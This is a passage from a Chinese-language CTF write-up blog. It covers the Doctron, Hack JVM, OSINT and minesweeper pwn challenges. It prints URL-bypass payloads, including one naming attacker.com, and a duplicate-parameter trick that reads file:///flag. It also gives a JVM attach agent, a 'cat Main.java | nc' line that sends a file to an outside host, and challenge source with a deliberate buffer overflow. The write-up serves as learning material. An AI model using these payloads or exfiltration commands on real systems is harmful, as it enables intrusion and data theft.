class="subst">&#123;flag&#125;</span></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(pipeline)</span><br></pre></td></tr></table></figure></div>

<h3 id="Doctron"><a href="#Doctron" class="headerlink" title="Doctron"></a>Doctron</h3><p>出题人大概是神人吧，直接找了一个开源项目来做题目。</p>
<p>最开始的思路就是正确的，即让网页显示flag再通过pdf打印返回。</p>
<p>直接请求file:&#x2F;&#x2F;&#x2F;flag，自然而然被block了。</p>
<p>先尝试正常使用功能，本地部署以后访问<code>&#39;/convert/html2pdf?u=doctron&amp;p=lampnick&amp;WaitingTime=1000000000&amp;url=http://example.com&#39;</code>，部分时候可以实现正常打印。</p>
<blockquote>
<p>加个<code>&amp;WaitingTime=1000000000</code>就是因为老是报错超时，但是似乎加了也改观不大</p>
</blockquote>
<p>项目比较大，经过大量源码阅读后，注意到对file协议的限制主要在于<code>middleware\params.go</code>处的<code>func CheckParams(ctx iris.Context)</code>：</p>
<div class="code-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> u.Scheme != <span class="string">&quot;http&quot;</span> &amp;&amp; u.Scheme != <span class="string">&quot;https&quot;</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>而打印处chromedp则没有进一步限制：</p>
<div class="code-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="code"><pre><span class="line">chromedp.Run(ctx, chromedp.Tasks&#123;</span><br><span class="line">    chromedp.Navigate(ins.cc.Url),</span><br><span class="line">    chromedp.Sleep(firstPageWait),</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></div>

<p>首先尝试的是特殊url请求，阅读go<code>u.Scheme</code>的源码，发现go判断Scheme的方式就是<code>:</code>之前的字符串。<br>查阅网上的绕过方案，大多数都是之前就用过的<code>@</code>而无法绕过协议。<br>尝试了</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http:file:///flag</span><br><span class="line">http://example.com#file:///flag</span><br><span class="line">http://attacker.com%0D%0Alocation=file:///flag</span><br><span class="line">http://attacker.com/\..\file:///flag</span><br><span class="line">http://example.com/file:///etc/passwd</span><br></pre></td></tr></table></figure></div>
<p>等url尝试绕过无果，最终依然使用http协议。<br>以及找了<a class="link"   href="https://github.com/QGG4588/urls_bypass.git" >urls_bypass<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>项目尝试破解无果。</p>
<p>过程中还产生过使用Chrome沙箱逃逸的思路，甚至找到了<code>CVE-2025-2783</code>的逃逸漏洞，但是漏洞太新官方都没有技术文档，于是放弃。</p>
<p>还尝试过之前的特殊请求头，例如</p>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="code"><pre><span class="line"><span class="attr">&quot;X-Original-URL&quot;</span><span class="punctuation">:</span> <span class="string">&quot;file:///flag&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;X-Rewrite-URL&quot;</span><span class="punctuation">:</span> <span class="string">&quot;file:///flag&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;X-Forwarded-Proto&quot;</span><span class="punctuation">:</span> <span class="string">&quot;file&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;Forwarded&quot;</span><span class="punctuation">:</span> <span class="string">&quot;proto=file&quot;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure></div>
<p>无果。</p>
<p>最终方案还是磨AI磨出来的，原话是：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 框架特性利用 ：</span><br><span class="line">   Iris的ctx.URLParam()方法存在解析特性：</span><br></pre></td></tr></table></figure></div>
<p>请求的时候使用两个url参数，即<code>/convert/html2pdf?u=doctron&amp;p=lampnick&amp;WaitingTime=10000000000000000000&amp;url=http:///flag&amp;url=file:///flag</code><br>然后本地调试就可以非常神奇地发现CheckParams依然采用前一个url判断成http，而到了Chromedp确是用了第二个file协议url！！！<br>背后的原理似乎和学长翻到的go源码有关系，在go源码<code>\src\net\url\url.go:1114</code>下的Query函数返回的Values是<code>map[string][]string</code>。</p>
<p>不论如何成功获取到了flag如下<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://free.boltp.com/2025/05/05/6818817f7817f.png"
                      style="height:300px; display:block; margin: 0 auto;"
                ></p>
<h3 id="Hack-JVM"><a href="#Hack-JVM" class="headerlink" title="Hack JVM"></a>Hack JVM</h3><p>中后期学长忙pwn后比较独立完成的一题，应该说应该是不难的，我Java零基础(?)都能按提示摸到JVM Attach，只有5个解出不太应该</p>
<p>查看源码可以看到Flag在Main.java里面，在运行后被删除了</p>
<p>执行<code>ls</code>，发现运行目录下有一个<code>hsperfdata_ctf</code>文件，<code>cat</code>后得到49，经解释是java运行的pid<br>尝试ls <code>/proc/49</code>下的文件，没有太多有用信息</p>
<p>一开始AI给的思路是修改<code>libdecrypt.so</code>让java在解密时顺带把flag输出了<br>尝试把hack了的cpp使用base64将二进制写入到服务器但是发现服务器没有编译环境<br>费劲尝试在本地配置好JVM的C库以及交叉编译以后同样base64传上去<br>后才意识到<code>libdecrypt.so</code>必须要重新启动才能应用更改，而重新启动就连不上容器执行命令了……</p>
<p>最终回归JVM Attach的题目提示，查阅到使用如下<code>Agent.java</code>还原Main.java</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachine;</span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachineDescriptor;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"></span><br><span class="line"><span class="comment">//! MANIFEST.MF必须大写！</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Agent</span> &#123;</span><br><span class="line">    <span class="comment">// Agent部分</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String args, Instrumentation inst)</span> &#123;</span><br><span class="line">        <span class="type">ClassFileTransformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassFileTransformer</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className,</span><br><span class="line">                    Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain,</span><br><span class="line">                    <span class="type">byte</span>[] classfileBuffer) &#123;</span><br><span class="line">                <span class="keyword">if</span> (className.equals(<span class="string">&quot;com/example/Main&quot;</span>)) &#123;</span><br><span class="line">                    <span class="comment">// 保存获取到的字节码</span></span><br><span class="line">                    <span class="keyword">try</span> (<span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;Main.class&quot;</span>)) &#123;</span><br><span class="line">                        fos.write(classfileBuffer);</span><br><span class="line">                        System.out.println(<span class="string">&quot;已保存类文件到 Main.class&quot;</span>);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> classfileBuffer;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            inst.addTransformer(transformer, <span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">for</span> (Class&lt;?&gt; clazz : inst.getAllLoadedClasses()) &#123;</span><br><span class="line">                <span class="keyword">if</span> (clazz.getName().equals(<span class="string">&quot;com.example.Main&quot;</span>)) &#123;</span><br><span class="line">                    inst.retransformClasses(clazz);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Attach部分</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (VirtualMachineDescriptor vmd : VirtualMachine.list()) &#123;</span><br><span class="line">                <span class="keyword">if</span> (vmd.displayName().contains(<span class="string">&quot;com.example.Main&quot;</span>)) &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;找到目标JVM进程: &quot;</span> + vmd.id());</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 附加到目标JVM</span></span><br><span class="line">                    <span class="type">VirtualMachine</span> <span class="variable">vm</span> <span class="operator">=</span> VirtualMachine.attach(vmd.id());</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 修改这里：使用File获取绝对路径</span></span><br><span class="line">                    <span class="type">String</span> <span class="variable">agentPath</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;agent.jar&quot;</span>).getAbsolutePath();</span><br><span class="line">                    System.out.println(<span class="string">&quot;使用Agent路径: &quot;</span> + agentPath);</span><br><span class="line"></span><br><span class="line">                    vm.loadAgent(agentPath);</span><br><span class="line">                    vm.detach();</span><br><span class="line">                    System.out.println(<span class="string">&quot;Agent注入完成&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>使用<code>javac</code>、<code>jar</code>等打包出二进制后同样base64发送到服务器，<br>随后<code>chmod +x</code>，<code>java -cp agent.jar:$JAVA_HOME/lib/tools.jar Agent &amp;</code>(注意加上&amp;不然卡死)，<br>再次ls可以惊喜地发现Main.java以及被写出来了。</p>
<p>尝试cat回来但是</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">(&#x27;Connection broken: IncompleteRead(0 bytes read, 1173 more expected)&#x27;, IncompleteRead(0 bytes read, 1173 more expected))</span><br><span class="line">urllib3.exceptions.IncompleteRead: IncompleteRead(0 bytes read, 1173 more expected) The above exception was the direct cause of the following exception:</span><br><span class="line">...</span><br></pre></td></tr></table></figure></div>

<p>经过学长指点使用cat Main.java | nc xxx:xxx后成功获取到了Main.java以及其中的flag</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://free.boltp.com/2025/05/05/6818944d64dce.webp"
                      style="height:300px; display:block; margin: 0 auto;"
                >

<h1 id="OSINT"><a href="#OSINT" class="headerlink" title="OSINT"></a>OSINT</h1><h3 id="海的那边是"><a href="#海的那边是" class="headerlink" title="海的那边是"></a>海的那边是</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://s2.loli.net/2025/05/04/CyswUcAJVWR6DFM.png"
                      alt="image-20250504223033882"
                ></p>
<p>有几题不确定，所以遍历了一下候选答案范围，最后扫出来是这一组：</p>
<p>（致敬传奇轮子王自信关掉copilot搓递归全排列搓了二十分钟搓不出来红温跳脚一怒之下使用波动拳施展古法递归）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://s2.loli.net/2025/05/05/OWkmI4o1GAvlejD.png"
                      alt="image-20250505004817774"
                ></p>
<h4 id="拍摄时间"><a href="#拍摄时间" class="headerlink" title="拍摄时间"></a>拍摄时间</h4><p>图片的 metadata：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://s2.loli.net/2025/05/04/9KxJlPgT47eGyzD.png"
                      alt="image-20250504223259700"
                ></p>
<h4 id="拍摄地点"><a href="#拍摄地点" class="headerlink" title="拍摄地点"></a>拍摄地点</h4><p>找了个 AI 跑出了这个结果：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://s2.loli.net/2025/05/05/ztmWTPgBORZYcDj.png"
                      alt="image-20250505164316591"
                ></p>
<p>事后看，AI 猜对了充电桩型号和公交车，我觉得猜对公交车就 nm 离谱，鬼知道他怎么知道的…</p>
<p>这个地址是错的，不过我们从这里开始顺着海岸线找，十分走运地找到了这个熟悉的建筑，以及熟悉的灯和树：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://s2.loli.net/2025/05/05/FIWvhZe7VrAfs24.png"
                      alt="image-20250505164536395"
                ></p>
<h4 id="充电桩型号"><a href="#充电桩型号" class="headerlink" title="充电桩型号"></a>充电桩型号</h4><p>国际充电桩型号一共也没几种，直接遍历了。</p>
<h4 id="公交车"><a href="#公交车" class="headerlink" title="公交车"></a>公交车</h4><p>最近的公交站是这个，唯一的班次是 30：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://s2.loli.net/2025/05/05/HfTUoMBPiyutKRd.png"
                     
                ></p>
<h4 id="潮汐"><a href="#潮汐" class="headerlink" title="潮汐"></a>潮汐</h4><p>在下面的网站随便找了个 La Jolla 海岸的地方看潮汐表：</p>
<p><a class="link"   href="https://zh.tideschart.com/United-States/California/San-Diego-County/La-Jolla-Shores-Beach/Weekly/" >https://zh.tideschart.com/United-States/California/San-Diego-County/La-Jolla-Shores-Beach/Weekly/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://s2.loli.net/2025/05/05/xBS9pyvtjlh8QEd.png"
                      alt="image-20250505164822771"
                ></p>
<p>4.82 ft，大概 130cm+，周期大概 10h，在这两个值周围开了个范围扫了一下。</p>
<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="WMC25-D0"><a href="#WMC25-D0" class="headerlink" title="WMC25 D0"></a>WMC25 D0</h3><ul>
<li>Author:kuroko</li>
<li>Difficulty:Trivial</li>
<li>Category:Pwn</li>
</ul>
<p>说实话，WMC系列题目真的是感触最深的题目，算是非常好的pwn入门引路人，感谢kuroko前辈</p>
<p>扫雷的规则是雷是按照规则生成的，只有完全确定的信息才会扫雷成功，否则一定会爆雷，所以我们只要找到一个可以稳定通关的序列就好，因为给了源码，可以通过把exit注释掉方便尝试：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N 5</span></span><br><span class="line"></span><br><span class="line"><span class="type">time_t</span> last;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">()</span> &#123; system(<span class="string">&quot;/bin/sh&quot;</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">16</span>] = &#123;&#125;;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;You win! Please sign your name: &quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x408</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nLeaderboard\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;01 %16s ... %ds\n\n&quot;</span>, buf, last);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strlen</span>(buf) &gt; <span class="number">16</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Your name is too long, which will break our award ceremony!\n&quot;</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Just give us another shorter nickname: &quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Thanks for playing my game.\n&quot;</span>);</span><br><span class="line">  win();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> game_grid[N][N] = &#123;&#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>&#125;,</span><br><span class="line">                                 &#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&#125;,</span><br><span class="line">                                 &#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&#125;,</span><br><span class="line">                                 &#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>&#125;,</span><br><span class="line">                                 &#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>&#125;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> check_grid[N][N];</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> hint_grid[N][N] = &#123;</span><br><span class="line">    &#123;<span class="number">-1</span>, <span class="number">-1</span>, <span class="number">3</span>, <span class="number">-1</span>, <span class="number">-1</span>&#125;, &#123;<span class="number">-1</span>, <span class="number">4</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>&#125;, &#123;<span class="number">-1</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">2</span>&#125;,</span><br><span class="line">    &#123;<span class="number">2</span>, <span class="number">3</span>, <span class="number">-1</span>, <span class="number">3</span>, <span class="number">-1</span>&#125;,   &#123;<span class="number">-1</span>, <span class="number">-1</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">-1</span>&#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> total_mine = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_grid</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> grid[][N])</span> &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n    A B C D E\n\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i++) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d   &quot;</span>, i + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; N; j++) &#123;</span><br><span class="line">      <span class="keyword">switch</span> (grid[i][j]) &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;. &quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">if</span> (hint_grid[i][j] == <span class="number">-1</span>) &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;? &quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, hint_grid[i][j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;# &quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;X &quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">count_mine</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> grid[][N])</span> &#123;</span><br><span class="line">  <span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; ++i) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; N; ++j) &#123;</span><br><span class="line">      cnt += grid[i][j] == <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> cnt;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">check_valid</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> grid[][N])</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (count_mine(grid) != total_mine)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// LV.0 Rule</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; ++i) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; N; ++j) &#123;</span><br><span class="line">      <span class="keyword">if</span> (grid[i][j] == <span class="number">1</span> &amp;&amp; hint_grid[i][j] != <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> dx = <span class="number">-1</span>; dx &lt;= <span class="number">1</span> &amp;&amp; i + dx &lt; N; ++dx) &#123;</span><br><span class="line">          <span class="keyword">for</span> (<span class="type">int</span> dy = <span class="number">-1</span>; dy &lt;= <span class="number">1</span> &amp;&amp; j + dy &lt; N; ++dy) &#123;</span><br><span class="line">            cnt += i + dx &gt;= <span class="number">0</span> &amp;&amp; j + dy &gt;= <span class="number">0</span> &amp;&amp; grid[i + dx][j + dy] == <span class="number">2</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (cnt != hint_grid[i][j])</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">find_any_sol</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> mine)</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (x &gt;= N * N) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> *ptr = &amp;check_grid[x / <span class="number">5</span>][x % <span class="number">5</span>];</span><br><span class="line">  <span class="keyword">if</span> (*ptr == <span class="number">0</span>) &#123;</span><br><span class="line">    *ptr = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mine &lt;= <span class="number">1</span>) &#123;</span><br><span class="line">      <span class="type">int</span> result = check_valid(check_grid);</span><br><span class="line">      <span class="keyword">if</span> (!result)</span><br><span class="line">        *ptr = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> i = x + <span class="number">1</span>; i &lt; N * N; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (find_any_sol(i, mine - <span class="number">1</span>)) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    *ptr = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">validate_move</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y, <span class="type">int</span> op)</span> &#123;</span><br><span class="line">  <span class="built_in">memcpy</span>(check_grid, game_grid, <span class="keyword">sizeof</span>(game_grid));</span><br><span class="line"></span><br><span class="line">  check_grid[x][y] = <span class="number">3</span> - op;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> mine = total_mine - count_mine(check_grid);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N * N - mine; ++i) &#123;</span><br><span class="line">    <span class="keyword">if</span> (find_any_sol(i, mine)) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nLet&#x27;s play the Minesweeper game &lt;3\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">time_t</span> begin;</span><br><span class="line">  time(&amp;begin);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="type">int</span> row, op;</span><br><span class="line">    <span class="type">char</span> col;</span><br><span class="line"></span><br><span class="line">    print_grid(game_grid);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nRemaining / Total Mine: %d / %d\n&quot;</span>,</span><br><span class="line">           total_mine - count_mine(game_grid), total_mine);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n[1-5] [A-E] [1|2] (1 - check, 2 - flag)\nMove: &quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">scanf</span>(<span class="string">&quot;%d %c %d&quot;</span>, &amp;row, &amp;col, &amp;op) != <span class="number">3</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;\nInvalid input\n&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> x = row - <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> y = <span class="built_in">toupper</span>(col) - <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (x &lt; <span class="number">0</span> || x &gt;= N || y &lt; <span class="number">0</span> || y &gt;= N || op &lt; <span class="number">1</span> || op &gt; <span class="number">2</span> ||</span><br><span class="line">        game_grid[x][y] != <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;\nInvalid move\n&quot;</span>);</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!validate_move(x, y, op)) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(op == <span class="number">1</span> ? <span class="string">&quot;\nGame over! You stepped on a landmine.\n&quot;</span></span><br><span class="line">                     : <span class="string">&quot;\nGame over! You flagged a false landmine.\n&quot;</span>);</span><br><span class="line">      print_grid(check_grid);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      game_grid[x][y] = op;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> 